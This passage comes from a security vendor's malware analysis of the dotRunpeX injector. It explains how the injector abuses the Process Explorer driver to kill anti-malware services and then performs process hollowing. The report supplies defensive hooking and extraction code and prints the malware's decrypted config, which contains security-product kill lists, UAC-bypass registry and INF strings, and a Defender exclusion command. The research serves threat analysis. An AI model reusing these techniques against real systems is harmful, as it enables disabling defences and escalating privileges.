specified&nbsp;<code>SystemInformationClass</code>&nbsp;0x10 that points to the undocumented structure&nbsp;[<a href=\"https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle.htm?tx=56)\"><code>SYSTEM_HANDLE_INFORMATION</code></a>]. This way, it finds all handles that belong to the protected process.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27709\" height=\"106\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId197-1024x106.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 47: NtQuerySystemInformation used to obtain undocumented structure SYSTEM_HANDLE_INFORMATION</figcaption></figure></div>\n\n\n<p>To process object handles of protected process, dotRunpeX uses WIN API&nbsp;<code>DeviceIoControl</code>&nbsp;to send IOCTL directly to the vulnerable procexp driver. The IOCTL \u201c<em><strong>2201288708</strong></em>\u201d (<code>IOCTL_CLOSE_HANDLE</code>) is in&nbsp;<code>RDX</code>&nbsp;register, and procexp driver routine processing this request is responsible for closing certain object handle of the specified process, regardless of whether the specified process is protected or not. Once enough object handles are closed, the Anti-Malware service is killed.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27710\" height=\"337\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId200-1-1024x337.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 48: DeviceIoControl used to send the IOCTL \u201c2201288708\u201d to close the object handle of the protected process</figcaption></figure></div>\n\n\n<p>We could also see that register&nbsp;<code>R8</code>&nbsp;(<code>lpInBuffer</code>) points to data required to close the object handle. This data structure could be defined as follows:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">typedef struct _ioControl\n{\n    ULONGLONG ulPID;\n    PVOID lpObjectAddress;\n    ULONGLONG ulSize;\n    ULONGLONG ulHandle;\n} PROCEXP_DATA_EXCHANGE, *PPROCEXP_DATA_EXCHANGE;</pre>\n\n\n\n<p>Let\u2019s compare the procexp driver version used by all samples of dotRunpeX (version 16.43 &#8211; compiled 2021-08-17) and the latest version of the procexp driver (version 17.02 &#8211; compiled 2022-11-10). We can immediately spot the added patching code that is responsible for disabling the possibility of closing object handles of protected processes.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27711\" height=\"469\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId203-1-1024x469.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 49: Process Explorer driver version 16.43 vs.&nbsp;17.02</figcaption></figure></div>\n\n\n<p>This technique of closing object handles of protected processes using the process explorer driver is well documented and part of an open-source project called&nbsp;<a href=\"https://github.com/Yaxser/Backstab\">Backstab</a>. Process explorer drivers version 17.0+ are already patched.</p>\n\n\n\n<p>After killing specific protected processes, Process Hollowing is what follows using WIN API&nbsp;<code>CreateProcessW</code>&nbsp;to start the process as suspended (in this case&nbsp;<code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe</code>) and direct NT API&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;to write embedded payload of dotRunpeX into the newly created remote process.</p>\n\n\n\n<p>It turned out that with an approach of dynamic analysis that focused on the native layer and certain usage of WIN/NT APIs, we got some interesting findings of this virtualized dotnet injector that could be used for automation and mass processing:</p>\n\n\n\n<ul>\n<li>Each dotRunpeX sample has an embedded payload of a certain malware family to be injected</li>\n\n\n\n<li>Each dotRunpeX sample has an embedded procexp driver to kill protected processes</li>\n\n\n\n<li>There is very likely some kind of config hidden behind the virtualized code that specifies the target process for Process Hollowing, a protected process list to be killed (Anti-Malware services), and probably other interesting configurable things.</li>\n</ul>\n\n\n\n<p>Encouraged by these findings, we can move forward to some automation using knowledge from the .NET internals world. When we are talking about dotnet, we can immediately think of code being managed by .NET runtime. More things are being managed, and among them is one very important for our further process, and that is so-called \u201c<em><strong>Memory Management</strong></em>\u201d. The types of memory in dotnet are stack and .NET heap. In the dotnet world, we do not need to bother with memory allocation/deallocation because these routines are handled by .NET runtime and garbage collector. Memory management of dotnet somehow needs to know what to allocate, where, and how; the same goes for deallocation/freeing of memory. Allocation on the .NET heap occurs once we talk about reference types inheriting from&nbsp;<code>System.Object</code>&nbsp;(<em><strong>class, object, string\u2026</strong></em>). These objects are saved on the .NET heap, and for the purpose of their automatic management, they are accompanied by certain metadata information such as their type, references, and size. Even better, the automatic memory deallocation of no longer referenced objects does not occur immediately &#8211; the garbage collector takes care of this in some time intervals, which could be several minutes. Particular objects like \u201c<em><strong>static objects</strong></em>\u201d survive garbage collections and live till the application ends.</p>\n\n\n\n<p>This means that if we could enumerate objects on the .NET heap, we could also get information related to their types and size that can serve for their appropriate reconstruction. Creating this kind of tool would be very likely time-consuming, but luckily for us, there is already created dotnet process and crash dump introspection open-source library&nbsp;<a href=\"https://github.com/microsoft/clrmd\">ClrMD</a>&nbsp;<code>Microsoft.Diagnostics.Runtime</code>&nbsp;developed by Microsoft that could be used precisely for object reconstruction from .NET heap. Why is that so important?</p>\n\n\n\n<p>In a certain moment of dotRunpeX execution, embedded payload, procexp driver, and some kind of config must appear in a decrypted state. Their content will likely be assigned to some object allocated on the .NET heap. For these, we could expect byte array&nbsp;<code>byte[]</code>&nbsp;or&nbsp;<code>string</code>. That also means that if we could control the execution of dotRunpeX and suspend it in a state we assume to be the right moment for those object reconstructions, we would be able to get all that we need in a decrypted state.</p>\n\n\n\n<p>One of the right moments for suspending and introspecting the dotRunpeX process could be an invocation of WIN API&nbsp;<code>CreateProcessW</code>&nbsp;used for Process Hollowing. This was approved to be the correct assumption and led us to develop the hooking library \u201c<em><strong>CProcessW_Hook</strong></em>\u201d exactly for this purpose.</p>\n\n\n\n<h2 class=\"wp-block-heading\">CProcessW_Hook</h2>\n\n\n\n<p>Native hooking library using&nbsp;<a href=\"https://github.com/TsudaKageyu/minhook\">minhook</a>&nbsp;framework (The Minimalistic x86/x64 API Hooking Library for Windows). The code provided below serves the purpose of hooking the WIN API function&nbsp;<code>CreateProcessW</code>, which is used in the dotRunpeX injector for process creation that is later used as a target for code injection (<em><strong>PE Hollowing</strong></em>). Once the&nbsp;<code>CreateProcessW</code>&nbsp;function is hooked and called in the target process, the whole process gets suspended to introspect. Certain process creations are filtered (powershell, conhost) as they can be spawned for other functionalities of dotRunpeX according to config (example modification of Windows Defender settings). We need to suspend the process only in a state before performing code injection (where all required objects are already decrypted on the .NET heap).</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">#include &lt;windows.h>\n#include &lt;string.h>\n#include \"pch.h\"\n#include \"MinHook.h\"\n\n#pragma warning(disable : 4996)\n\n#if defined _M_X64\n#pragma comment(lib, \"libMinHook.x64.lib\")\n#elif defined _M_IX86\n#pragma comment(lib, \"libMinHook.x86.lib\")\n#endif\n\ntypedef LONG (__stdcall* NTSUSPENDPROCESS)(HANDLE ProcessHandle);\ntypedef BOOL (__stdcall* CREATEPROCESSW)(LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);\n\nCREATEPROCESSW fpCreateProcessW = NULL;\n\n__declspec(dllexport) void __cdecl Decoy() \n{\n    Sleep(1000);\n}\n\nint __stdcall DetourCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)\n{\n    LPCWSTR ignoredProcess[2] = { L\"powershell\", L\"conhost\" };\n    for (int i = 0; i &lt; 2; i++)\n    {\n        if (wcsstr(_wcslwr(lpApplicationName), ignoredProcess[i]))\n        {\n            return fpCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);\n        }\n    }\n\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    if (!hNtdll)\n    {\n        ExitProcess(0);\n    }\n    NTSUSPENDPROCESS NtSuspendProcess = (NTSUSPENDPROCESS)GetProcAddress(hNtdll, \"NtSuspendProcess\");\n    if (!NtSuspendProcess)\n    {\n        CloseHandle(hNtdll);\n        ExitProcess(0);\n    }\n    HMODULE cProcess = GetCurrentProcess();\n    if (!cProcess) \n    {\n        CloseHandle(hNtdll);\n        ExitProcess(0); \n    }\n    NtSuspendProcess(cProcess);\n    ExitProcess(0);\n    return  1;\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)\n{\n    switch (ul_reason_for_call)\n    {\n        case DLL_PROCESS_ATTACH:\n            if (MH_Initialize() != MH_OK)\n            {\n                return 1;\n            }\n            if (MH_CreateHook(&amp;CreateProcessW, &amp;DetourCreateProcessW, (LPVOID*)(&amp;fpCreateProcessW)) != MH_OK)\n            {\n                return 1;\n            }\n            if (MH_EnableHook(&amp;CreateProcessW) != MH_OK)\n            {\n                return 1;\n            }\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n        case DLL_PROCESS_DETACH:\n            break;\n    }\n    return TRUE;\n}</pre>\n\n\n\n<p>We could see that all hooking logic is executed right upon loading this library inside the function&nbsp;<code>DllMain()</code>. Another important thing to note is that we defined the export function&nbsp;<code>Decoy()</code>, which won\u2019t be ever executed or called but is needed later on for our preinjection technique.</p>\n\n\n\n<p>With the hooking library \u201c<em><strong>CProcessW_Hook.dll</strong></em>\u201d in its place, we can move on to create an injector and extractor. This points to the main tool provided below &#8211; dotRunpeX extractor \u201c<em><strong>Invoke-DotRunpeXextract</strong></em>\u201d.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Invoke-DotRunpeXextract</h2>\n\n\n\n<p>PowerShell module that enables the extraction of payload, procexp driver, and config from dotRunpeX. The tool is written in PowerShell scripting language using preinjection of native hooking library \u201c<em><strong>CProcessW_Hook.dll</strong></em>\u201d (using&nbsp;<a href=\"https://github.com/Washi1337/AsmResolver\">AsmResolver</a>) and .NET objects reconstruction from .NET heap (using&nbsp;<a href=\"https://github.com/microsoft/clrmd\">ClrMD</a>). It uses a dynamic approach for extraction, so samples are executed in a managed way (<em><strong>use only in VM</strong></em>). Using PowerShell 7.3+, clrMD v2.2.343001 (net6.0), AsmResolver v5.0.0 (net6.0).</p>\n\n\n\n<p>We provide two versions of this tool that can be downloaded along with the hooking library in the last section of this article. One is created multi-threaded as a PowerShell module for the best performance and usage. The second version of this tool is a single-threaded script with the same functionality that could be used for simple debugging and troubleshooting and can more easily serve to create several snippets with similar functionality.</p>\n\n\n\n<p>The whole code of this PowerShell module is annotated and commented on in a way to be easy to understand its core features. We will briefly describe the core functionality of this tool, like the preinjection technique of the hooking library using AsmResolver and implemented logic behind the extraction.</p>\n\n\n\n<p>At first, this tool modifies the PE structure of dotRunpeX using AsmResolver. AsmResolver is well known for its capability to inspect dotnet executables and their related metadata, but it also allows access to low-level structures of PE to modify them. These PE structure modifications are used to implement our so-called PoC technique for the purpose of dll preinjection to a 64-bit dotnet executable. We are talking about adding a new import entry for the native hooking library into the .NET Assembly. Since dotRunpeX is a 64-bit executable, and it turned out that, unlike the 32-bit dotnet executables, the 64-bit ones don\u2019t even have an import directory, we started building one from scratch right inside the function&nbsp;<code>PatchBinaryWithDllInjection()</code>. In this function, we can see that we are creating new data sections,&nbsp;<code>.idata</code>&nbsp;and&nbsp;<code>.data</code>, where our newly built IDT (<em><strong>Import Directory Table</strong></em>) and IAT (<em><strong>Import Address Table</strong></em>) will be placed. To get our hooking library \u201c<em><strong>CProcessW_Hook.dll</strong></em>\u201d preinjected right upon process start and let the windows loader do for us the hard work, we are creating an import entry with exported function&nbsp;<code>Decoy()</code>&nbsp;that was defined in the hooking library. As we are dealing with dotnet and adding native import,&nbsp;<strong>IL Only</strong>&nbsp;flag inside the .NET Directory is not true anymore and needs to be patched.</p>\n\n\n\n<p></p>\n\n\n\n<pre class=\"EnlighterJSRAW\">function PatchBinaryWithDllInjection($pathToSample, $patchedSample, $dllHookingName) \n{\n    # Exported function name \"Decoy\" from hooking library will be used for Import Directory creation \n    $symbolNameToImport = [AsmResolver.PE.PEImage]::FromFile($dllHookingName).Exports.Entries[0].Name # Decoy\n    # We need to work with pefile layer to expose sections - creation of Import Directory and IAT\n    $pefile = [AsmResolver.PE.File.PEFile]::FromFile($pathToSample)\n\n    # Creation of Import Directory from scratch\n    $impDirBuff = [AsmResolver.PE.Imports.Builder.ImportDirectoryBuffer]::new($false)\n    $impModule = [AsmResolver.PE.Imports.ImportedModule]::new($dllHookingName)\n    $symbol = [AsmResolver.PE.Imports.ImportedSymbol]::new(0,$symbolNameToImport)\n    $impModule.Symbols.Add($symbol)\n    $impDirBuff.AddModule($impModule)\n\n    # Creation of \".idata\" section where Import Directory will be placed\n    $idataSection = [AsmResolver.PE.File.PESection]::new(\".idata\", [AsmResolver.PE.File.Headers.SectionFlags]::MemoryRead -bor [AsmResolver.PE.File.Headers.SectionFlags]::ContentInitializedData)\n    $idataSection.Contents = $impDirBuff\n    $pefile.Sections.Add($idataSection)\n\n    # Creation of \".data\" section where IAT will be placed\n    $dataSection = [AsmResolver.PE.File.PESection]::new(\".data\", [AsmResolver.PE.File.Headers.SectionFlags]::MemoryRead -bor [AsmResolver.PE.File.Headers.SectionFlags]::MemoryWrite -bor [AsmResolver.PE.File.Headers.SectionFlags]::ContentInitializedData)\n    $dataSection.Contents = $impDirBuff.ImportAddressDirectory\n    $pefile.Sections.Add($dataSection)\n\n    # Remove ASLR (no reloc)\n    $pefile.OptionalHeader.DllCharacteristics = $pefile.OptionalHeader.DllCharacteristics -bxor [AsmResolver.PE.File.Headers.DllCharacteristics]::DynamicBase\n    # Update offsets and RVA of newly created data sections (so we can work with them later on)\n    $pefile.UpdateHeaders()\n\n    # Update info about new data directories in context of pefile - Import Directory, IAT\n    $pefile.OptionalHeader.DataDirectories[[AsmResolver.PE.File.Headers.DataDirectoryIndex]::ImportDirectory] = [AsmResolver.PE.File.Headers.DataDirectory]::new($idataSection.Rva, $idataSection.GetPhysicalSize())\n    $pefile.OptionalHeader.DataDirectories[[AsmResolver.PE.File.Headers.DataDirectoryIndex]::IatDirectory] = [AsmResolver.PE.File.Headers.DataDirectory]::new($dataSection.Rva, $dataSection.GetPhysicalSize())\n    $pefile.Write($patchedSample)\n\n    # We need to do some custom patching of IL only flag inside .NET Directory (it is easier than making custom writer preserving all PE sections and meta) - we are adding native imports so IL only is not true anymore\n    $dotnetDirectoryRVA = $pefile.OptionalHeader.DataDirectories[[AsmResolver.PE.File.Headers.DataDirectoryIndex]::ClrDirectory].VirtualAddress\n    $dotnetDirectoryFileOffset = $pefile.RvaToFileOffset($dotnetDirectoryRVA)\n    $dotnetDirectoryILFlagsFileOffset = $dotnetDirectoryFileOffset + 16\n    $filestream = [System.IO.FileStream]::new($patchedSample, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)\n    $filestream.Position = $dotnetDirectoryILFlagsFileOffset\n    $filestream.Write([byte[]]::new(4), 0, 4) # Wipe the IL only flags\n    $filestream.Close()   \n}</pre>\n\n\n\n<p></p>\n\n\n\n<p>A comparison of the dotRunpeX sample before and after the described modification of the PE structure can be seen in the picture below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27712\" height=\"509\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId211-1-1024x509.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 50: PE structure of the dotRunpeX sample before and after modification used for dll preinjection</figcaption></figure></div>\n\n\n<p>Now, we get to the state where our modified binary could be executed. With the hooking library in its place, the dotRunpeX process gets suspended right during the call to WIN API&nbsp;<code>CreateProcessW</code>. This exact routine is implemented in the function&nbsp;<code>StartProcessWaitSuspended()</code>.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">function StartProcessWaitSuspended($patchedSample)\n{\n    $process = [System.Diagnostics.Process]::Start($patchedSample)\n    while ($process.Threads.Where{$_.ThreadState -ne [System.Diagnostics.ThreadState]::Wait -and $_.WaitReason -ne [System.Diagnostics.ThreadWaitReason]::Suspended}) \n    {\n        Start-Sleep -Milliseconds 500\n        $process.Refresh()\n    }\n    return $process  \n}</pre>\n\n\n\n<p>Once the process is suspended, it is ready to be introspected. The whole logic behind the introspection of the dotRunpeX process can be seen in the function&nbsp;<code>GetPayloadAndConfig()</code>. In this function, we use the clrMD library to attach to the desired process and enumerate all&nbsp;<code>System.Byte[]</code>&nbsp;objects that are currently allocated on the .NET heap. To reconstruct the payload intended to be injected, we have implemented some dummy logic to find byte array objects larger than 1KB and starting with the \u201c<em><strong>MZ</strong></em>\u201d header. Despite the fact how it sounds, it has proven to be enough to fulfill our needs.</p>\n\n\n\n<p>The logic behind finding the object corresponding to the process explorer driver and config is slightly different. First of all, the procexp driver and constants related to the config are saved in the same object. We assume that this is a result of the combination of usage KoiVM virtualizer and ConfuserEx obfuscator together as ConfuserEx usually puts defined constants to one blob of byte array and resolves them during the runtime once they are needed. After the logic finds this kind of byte blob, it separates the process explorer driver and config and pushes the config for further processing.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">function GetPayloadAndConfig($process) \n{   # DataTarget is our suspended process\n    $dataTarget = [Microsoft.Diagnostics.Runtime.DataTarget]::AttachToProcess($process.Id, $false)  \n    Start-Sleep -Seconds 1 # Better to wait for ClrMD - to properly initialize DataTarget \n    $clrInfo = $dataTarget.ClrVersions[0]\n    $clrRuntime = $clrInfo.CreateRuntime()\n    \n    # Getting all byte array objects from .NET Heap and sort them by size descending\n    $objects = $clrRuntime.Heap.EnumerateObjects().ToArray().Where{$_.Type.Name -eq \"System.Byte[]\"} | Sort-Object -Property Size -Descending\n    # Find payload to be injected - should be the largest byte array containing PE\n    $payload = @()\n    foreach ($object in $objects)\n    {   \n        # Check if byte array possible valid PE\n        if($object.AsArray().Length -gt 1024)\n        {\n            if((Compare-Object ($object.AsArray().ReadValues[byte](0,2)) ([byte[]] 0x4d,0x5a)).Length -eq 0)\n            {\n                $payload = $object.AsArray().ReadValues[byte](0, $object.AsArray().Length)\n                break\n            }\n        }\n    }\n    if(-not $payload){Write-Host \"Payload to be injected NOT found in sample:\"$process.MainModule.ModuleName\"!!!\" -ForegroundColor Red}\n    \n    # Find procexp driver + config (first 8 bytes of byte array skipped -> should be related to procexp PE size)\n    $procexpAndConfig = @()\n    foreach ($object in $objects)\n    {   \n        # Check if byte array possible procexp PE and config\n        if($object.AsArray().Length -gt 1024)\n        {\n            if((Compare-Object ($object.AsArray().ReadValues[byte](8,2)) ([byte[]] 0x4d,0x5a)).Length -eq 0)\n            {\n                $procexpAndConfig = $object.AsArray().ReadValues[byte](0, $object.AsArray().Length)\n                break\n            }\n        }\n    }\n    if(-not $procexpAndConfig)\n    {\n        Write-Host \"Procexp driver + config NOT found in sample:\"$process.MainModule.ModuleName\"!!!\" -ForegroundColor Red\n        $procexp = $null\n        $config = $null\n        return $payload, $procexp, $config\n    }   \n    # Process procexp and config\n    $procexpSize = [bitconverter]::ToInt32($procexpAndConfig[4..7], 0)\n    $procexp = $procexpAndConfig[8..($procexpSize+7)]\n    $config = $procexpAndConfig[($procexpSize +8)..$procexpAndConfig.Length]\n    \n    return $payload, $procexp, $config\n}\n</pre>\n\n\n\n<p>The so-called config is actually a bunch of constants where some of them serve as a configuration of dotRunpeX. This config needs to be parsed in the function&nbsp;<code>ParseConfig()</code>&nbsp;as it appears to be in some kind of structure where every string is preceded with its length and if needed, padded to have length divisible by 4, as shown in the picture below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27713\" height=\"233\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId214-1024x233.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 51: Unparsed config structure</figcaption></figure></div>\n\n\n<pre class=\"EnlighterJSRAW\">function ParseConfig($config)\n{\n    $memStream = [System.IO.MemoryStream]::new($config, $true)\n    $strLength = [byte[]]::new(4)\n    $parsedConfig = \"\"\n\n    while ($memStream.Position -lt $memStream.Length) \n    {\n        $memStream.Read($strLength, 0, 4) | Out-Null\n        $length = [bitconverter]::ToInt32($strLength, 0)\n        $buffer = [byte[]]::new($length)\n        $memStream.Read($buffer , 0, $length) | Out-Null\n        $parsedConfig += [System.Text.Encoding]::UTF8.GetString($buffer) + \"`n\"\n        if(($memStream.Position % 4) -ne 0)\n        {\n            $memStream.Position += 4 - ($memStream.Position % 4)\n        }\n    }\n    $memStream.Close()\n    return $parsedConfig\n}</pre>\n\n\n\n<p>Once we have properly parsed the config, it is saved with extracted payload and process explorer driver, the suspended process gets killed, and the modified dotRunpeX sample is removed.</p>\n\n\n\n<p>Example execution of \u201c<em><strong>Invoke-DotRunpeXextract</strong></em>\u201d and mass processing of samples could be seen below (2min GIF):</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27714\" height=\"1032\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/rId217.gif\" width=\"1922\" /></figure></div>\n\n\n<p>Figure 52: Execution of \u201c<em><strong>Invoke-DotRunpeXextract</strong></em>\u201d (2min GIF)</p>\n\n\n\n<p>As pointed out before, \u201c<em><strong>Invoke-DotRunpeXextract</strong></em>\u201d will produce a payload to be injected, procexp driver, and parsed constants values where some of them could be referred to as&nbsp;<strong>config</strong>. Example config file content for our analyzed sample of the dotRunpeX:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">False\nTrue\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nC14615024653444192E5F79157E215D3\n\"\nI_LOVE_HENTAIU2\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe\nError\n2345RTProtect\n2345SafeCenterSvc\n2345SafeSvc\n2345SafeTray\nkxetray\nkxescore\nkxemain\nkwsprotect64\nkscan\nHipsTray\nHipsDaemon\n360sd\n360rp\nQQPCTray\nQQPCRTP\n360tray\n360leakfixer\n360Safe\nZhuDongFangYu\nMultiTip\nAvastSvc\nsched\navp\nMcSvHost\navconfig\nbdagent\nMsMpEng\nwireshark\nMpCmdRun\nndd32\nnod32\nnod32krn\neguiProxy\nekrn\nSoftware\\Classes\\ms-settings\\shell\\open\\command\nDelegateExecute\ncmd.exe\n/C computerdefaults.exe\nRun without emulation\nSelect * from Win32_ComputerSystem\nManufacturer\nmicrosoft corporation\nModel\nVIRTUAL\nvmware\nVirtualBox\nThis file can't run into Virtual Machines.\nroot\\CIMV2\nSELECT * FROM Win32_VideoController\nName\nVMware\nVBox\nRun using valid operating system\nSbieDll.dll\nUSER\nSANDBOX\nVIRUS\nMALWARE\nSCHMIDTI\nCURRENTUSER\n\\VIRUS\nSAMPLE\nC:ile.exe\nAfx:400000:0\nHARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\nIdentifier\nVBOX\nHARDWARE\\Description\\System\nSystemBiosVersion\nVideoBiosVersion\nVIRTUALBOX\nSOFTWARE\\Oracle\\VirtualBox Guest Additions\nnoValueButYesKey\nC:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys\nVMWARE\nSOFTWARE\\VMware, Inc.\\VMware Tools\nHARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\nHARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\nSYSTEM\\ControlSet001\\Services\\Disk\\Enum\n0\nSYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\nDriverDesc\nSYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings\nDevice Description\nInstallPath\nC:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\\nC:\\WINDOWS\\system32\\drivers\\vmmouse.sys\nC:\\WINDOWS\\system32\\drivers\\vmhgfs.sys\nkernel32.dll\nwine_get_unix_file_name\nQEMU\n\\\\.\\ROOT\\cimv2\nDescription\nVM Additions S3 Trio32/64\nS3 Trio32/64\nVirtualBox Graphics Adapter\nVMware SVGA II\nnoKey\nFatal 'Error\nC:\\windows\\system32\\cmd.exe\n/K \"fodhelper.exe\"\nC:\\windows\\temp\n\\\n.inf\nREPLACE_COMMAND_LINE\n/au \ncmstp\n{ENTER}\n[version]\nSignature=$chicago$\nAdvancedINF=2.5\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n[RunPreSetupCommandsSection]\n; Commands Here will be run Before Setup Begins to install\nREPLACE_COMMAND_LINE\ntaskkill /IM cmstp.exe /F\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n[Strings]\nServiceName=\"CorpVPN\"\nShortSvcName=\"CorpVPN\"\nc:\\windows\\system32\\cmstp.exe\nWindows 1\nWindows 8\nWindows 7\nfodhelper\nSoftware\\Classes\\exefile\\shell\\open\\command\nslui\nSoftware\\Classes\\mscfile\\shell\\open\\command\neventvwr\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nProductName\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance\nEnabled\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nEnableLUA\npowershell\nSoftware\\Classes\\Folder\\shell\\open\\command\nSOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\nAdd-MpPreference -ExclusionPath \"\n\" -Force\n\u0418\u0438\u0441\u0443\u0441.sys\n\\Registry\\Machine\\System\\CurrentControlSet\\Services\\TaskKill\nSystem\\CurrentControlSet\\Services\\TaskKill\n\\??\\\nType\nErrorControl\nStart\nImagePath\n\\\\.\\\nSeDebugPrivilege\nSeLoadDriverPrivilege\n\\KnownDlls\\\nntdll.dll\nZwOpenSection\nZwMapViewOfSection\nNtClose\nZwUnmapViewOfSection\nMZ\n_4\nBIDEN_HARRIS_PERFECT_ASSHOLE\n</pre>\n\n\n\n<p>We can easily spot configuration strings related to persistence settings, resource name and its decryption key (where .NET resource contains payload to be injected), target binary for the payload to be injected in, Anti-Malware service names to be killed, UAC bypass, Anti-VM, Anti-Sandbox, procexp driver installation path and its name, etc.</p>\n\n\n\n<p>We provide two versions of this tool that can process just one sample or mass-process the directory of samples. For the best performance, the multi-threaded PowerShell module is recommended use. Still, for troubleshooting, simple modification, and easy debugging, we are also providing a single-threaded script with the same functionality as we expect soon some modification in dotRunpeX code where appropriate changes in the code of the tool or hooking library would be needed.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Conclusion</h1>\n\n\n\n<p>By monitoring this new threat for several months, we got deep insight into its evolution, delivery methods, and how it was abused to deliver a wide scale of different malware families.</p>\n\n\n\n<p>Over time, we consider dotRunpeX to be in high development adding new features on regular bases and getting more popularity and attention every day. Because of the rising usage of this injector, we developed and provided several tools to automate the analysis of this virtualized dotnet code.</p>\n\n\n\n<p>Some of the developed tools described in this report introduced PoC methods and can serve for developing other tools with similar functionality. We showed how open-source libraries such as AsmResolver and clrMD could be used in a real-world example to support the research and to help with the reverse engineering of protected code.</p>\n\n\n\n<p>In this report, we provided an in-depth analysis of both versions of the dotRunpeX injector, the similarities between them, and described the main interesting techniques they use, such as abuse of the vulnerable process explorer driver, code virtualization caused by the usage of KoiVM protector, modification of D/Invoke framework with decoy syscall patching.</p>\n\n\n\n<p>Our analysis and conclusions are based on dozens of campaigns we spotted in the wild and hundreds of samples that were mass processed.</p>\n\n\n\n<p>Because of the high development of dotRunpeX, we believe that provided tools would need some modification soon as a reaction to changes in dotRunpeX. Still, with provided source codes, it should be relatively easy to work around these changes for other researchers.</p>\n\n\n\n<p><strong>Check Point customers remain protected from the threats described in this blog</strong>, including all its variants.&nbsp;<em>Check Point\u2019s&nbsp;<a href=\"https://www.checkpoint.com/infinity/zero-day-protection/\">Threat Emulation</a></em>&nbsp;<em>protects networks against unknown threats in web downloads and e-mail attachments. The Threat Emulation engine picks up malware at the initial phase before it enters the network. The engine quickly quarantines and runs the files in a virtual sandbox environment, which imitates a standard operating system, to discover malicious behavior at the exploit phase.</em></p>\n\n\n\n<p><em><a href=\"https://www.checkpoint.com/harmony/anti-phishing/\">Harmony Email &amp; Office</a>&nbsp;deploys between the inbox and its native security. The solution secures inbound, outbound, and internal email from phishing attacks that evade platform-provided solutions and email gateways. It works with these other solutions and doesn\u2019t require any MX record changes that broadcast security protocols to hackers.</em></p>\n\n\n\n<h1 class=\"wp-block-heading\">IOCs</h1>\n\n\n\n<figure class=\"wp-block-table\"><table><thead><tr><th>SHA256 Hash</th><th>Version</th><th>Malware family of embedded 